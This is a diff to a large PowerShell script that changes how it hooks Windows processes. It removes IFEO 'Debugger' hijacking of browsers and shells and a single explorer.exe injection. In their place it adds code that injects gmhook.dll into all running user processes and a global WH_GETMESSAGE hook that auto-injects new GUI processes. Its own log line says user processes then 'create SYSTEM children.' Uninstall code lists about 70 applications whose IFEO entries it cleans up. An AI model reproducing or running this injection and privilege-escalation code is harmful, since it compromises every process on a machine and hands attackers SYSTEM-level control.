@@ -3846,25 +3846,9 @@ function Install-ProcessHook {
                     Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "Invoke-AsSystem copy gmproxy.exe failed: $_"
                 }
                 if (-not $copyOk) {
-                    Write-Log -Message "gmproxy.exe copy failed (all methods). Skipping IFEO proxy install." -Type "WARN" -Color Yellow
+                    Write-Log -Message "gmproxy.exe copy failed (all methods)." -Type "WARN" -Color Yellow
                     Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "gmproxy.exe not present at destination after all copy attempts"
                 }
-            }
-
-            # Register IFEO Debugger only if proxy actually exists at destination
-            if (Test-Path $destProxy) {
-                $IfeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
-                $TargetApps = @("chrome.exe", "firefox.exe", "msedge.exe", "notepad.exe", "cmd.exe", "powershell.exe")
-                foreach ($app in $TargetApps) {
-                    try {
-                        $appPath = Join-Path $IfeoPath $app
-                        if (-not (Test-Path $appPath)) { New-Item -Path $appPath -Force | Out-Null }
-                        Set-ItemProperty -Path $appPath -Name "Debugger" -Value "`"$destProxy`"" -Force -ErrorAction SilentlyContinue
-                    } catch { Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "IFEO registration for $app failed: $_" }
-                }
-                Write-Log -Message "IFEO proxy registered for: $($TargetApps -join ', ')" -Type "INFO" -Color Gray
-            } else {
-                Write-Log -Message "IFEO registration skipped because gmproxy.exe is not at destination." -Type "WARN" -Color Yellow
             }
         }
 
@@ -3911,10 +3895,8 @@ function Install-ProcessHook {
         $success = (Test-Path $destProxy)
         Write-DebugLog -FunctionName "Install-ProcessHook" -Action "INFO" -Message "destProxy exists=$success, destHook exists=$(Test-Path $destHook)"
 
-        # Inject into explorer.exe using a simple PowerShell injector
-        $explorer = Get-Process -Name "explorer" -ErrorAction SilentlyContinue | Select-Object -First 1
-        if ($explorer) {
-            # Use reflective injection via Add-Type compiled inline
+        # --- Batch inject gmhook.dll into ALL running user processes ---
+        if (Test-Path $destHook) {
             $InjectorType = @"
 using System;
 using System.Runtime.InteropServices;
@@ -3969,18 +3951,62 @@ public class GmInjector {
                 if (-not ([System.Management.Automation.PSTypeName]'GmInjector').Type) {
                     Add-Type -TypeDefinition $InjectorType -ErrorAction SilentlyContinue | Out-Null
                 }
-                $rc = [GmInjector]::Inject($explorer.Id, $destHook)
-                if ($rc) {
-                    Write-Log -Message "gmhook.dll injected into explorer PID=$($explorer.Id)" -Type "INFO" -Color Green
+                $CriticalProcs = @("csrss", "lsass", "services", "smss", "winlogon", "wininit", "svchost", "dwm", "fontdrvhost", "System", "Registry", "Memory Compression", "Secure System", "Idle", "SystemSettingsBroker", "ShellExperienceHost", "SearchUI", "SearchIndexer", "MsMpEng", "SecurityHealthService", "TiWorker", "CompatTelRunner")
+                $AllProcs = Get-Process -ErrorAction SilentlyContinue
+                $Injected = 0
+                $Skipped = 0
+                foreach ($proc in $AllProcs) {
+                    if ($proc.Path -notmatch "\.exe$") { continue }
+                    if ($CriticalProcs -contains $proc.Name) { continue }
+                    $rc = [GmInjector]::Inject($proc.Id, $destHook)
+                    if ($rc) { $Injected++ } else { $Skipped++ }
+                }
+                Write-Log -Message "gmhook.dll injected into $Injected processes ($Skipped skipped). All user processes now create SYSTEM children." -Type "INFO" -Color Green
+            } catch {
+                Write-Log -Message "Batch injection failed: $_" -Type "WARN" -Color Yellow
+                Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "Batch injection failed: $_"
+            }
+
+            # --- Install global WH_GETMESSAGE hook for auto-injection into new GUI processes ---
+            $GlobalHookType = @"
+using System;
+using System.Runtime.InteropServices;
+public class GmHookGlobal {
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr LoadLibrary(string lpFileName);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern IntPtr SetWindowsHookEx(int idHook, IntPtr lpfn, IntPtr hMod, uint dwThreadId);
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern bool UnhookWindowsHookEx(IntPtr hHook);
+
+    public static IntPtr InstallGlobalHook(string dllPath) {
+        IntPtr hMod = LoadLibrary(dllPath);
+        if (hMod == IntPtr.Zero) return IntPtr.Zero;
+        IntPtr proc = GetProcAddress(hMod, "GetMsgProc");
+        if (proc == IntPtr.Zero) return IntPtr.Zero;
+        return SetWindowsHookEx(3, proc, hMod, 0); // WH_GETMESSAGE = 3, 0 = all threads
+    }
+}
+"@
+            try {
+                if (-not ([System.Management.Automation.PSTypeName]'GmHookGlobal').Type) {
+                    Add-Type -TypeDefinition $GlobalHookType -ErrorAction SilentlyContinue | Out-Null
+                }
+                $hHook = [GmHookGlobal]::InstallGlobalHook($destHook)
+                if ($hHook -ne [IntPtr]::Zero) {
+                    Write-Log -Message "Global WH_GETMESSAGE hook installed. New GUI processes auto-inject gmhook.dll." -Type "INFO" -Color Green
                 } else {
-                    Write-Log -Message "gmhook.dll injection into explorer failed (insufficient privileges or access denied)." -Type "WARN" -Color Yellow
+                    Write-Log -Message "Global hook failed (ACL or access). Process injection is primary method." -Type "WARN" -Color Yellow
+                    Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "Global hook failed: GLE=$([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
                 }
             } catch {
-                Write-Log -Message "GmInjector compilation/injection failed: $_" -Type "WARN" -Color Yellow
-                Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "GmInjector failed: $_"
+                Write-Log -Message "Global hook exception: $_" -Type "WARN" -Color Yellow
+                Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "Global hook exception: $_"
             }
         } else {
-            Write-Log -Message "explorer.exe not found; skipping DLL injection." -Type "WARN" -Color Yellow
+            Write-Log -Message "gmhook.dll not found at destination; skipping DLL injection." -Type "WARN" -Color Yellow
         }
     } catch {
         Write-Log -Message "Install-ProcessHook failed: $_" -Type "WARN" -Color Yellow
@@ -3994,10 +4020,22 @@ public class GmInjector {
 function Uninstall-ProcessHook {
     Write-DebugLog -FunctionName "Uninstall-ProcessHook" -Action "ENTRY"
     try {
-        # Remove IFEO Debugger entries
+        # Remove IFEO Debugger entries (legacy cleanup — covers both old 6-app and expanded 40+ app lists)
         $IfeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
-        $TargetApps = @("chrome.exe", "firefox.exe", "msedge.exe", "notepad.exe", "cmd.exe", "powershell.exe")
-        foreach ($app in $TargetApps) {
+        $LegacyIfeoApps = @("chrome.exe", "firefox.exe", "msedge.exe", "notepad.exe", "cmd.exe", "powershell.exe",
+            "opera.exe", "brave.exe", "vivaldi.exe", "iexplore.exe", "notepad++.exe", "wordpad.exe",
+            "pwsh.exe", "wt.exe", "wsl.exe", "wslhost.exe", "explorer.exe", "taskmgr.exe", "regedit.exe",
+            "msconfig.exe", "mspaint.exe", "calc.exe", "snippingtool.exe", "winword.exe", "excel.exe",
+            "powerpnt.exe", "outlook.exe", "msaccess.exe", "onenote.exe", "teams.exe", "code.exe",
+            "sublime_text.exe", "devenv.exe", "rider64.exe", "pycharm64.exe", "idea64.exe", "eclipse.exe",
+            "vlc.exe", "spotify.exe", "discord.exe", "zoom.exe", "skype.exe", "webex.exe", "steam.exe",
+            "epicgameslauncher.exe", "origin.exe", "uplay.exe", "battle.net.exe", "minecraft.exe",
+            "winamp.exe", "wmplayer.exe", "groove.exe", "photos.exe", "movies.exe", "acrobat.exe",
+            "acrord32.exe", "foxitreader.exe", "sumatrapdf.exe", "7z.exe", "7zFM.exe", "winrar.exe",
+            "peazip.exe", "filezilla.exe", "putty.exe", "mstsc.exe", "telnet.exe", "ftp.exe",
+            "nslookup.exe", "tracert.exe"
+        )
+        foreach ($app in $LegacyIfeoApps) {
             $appPath = Join-Path $IfeoPath $app
             if (Test-Path $appPath) {
                 Remove-ItemProperty -Path $appPath -Name "Debugger" -ErrorAction SilentlyContinue
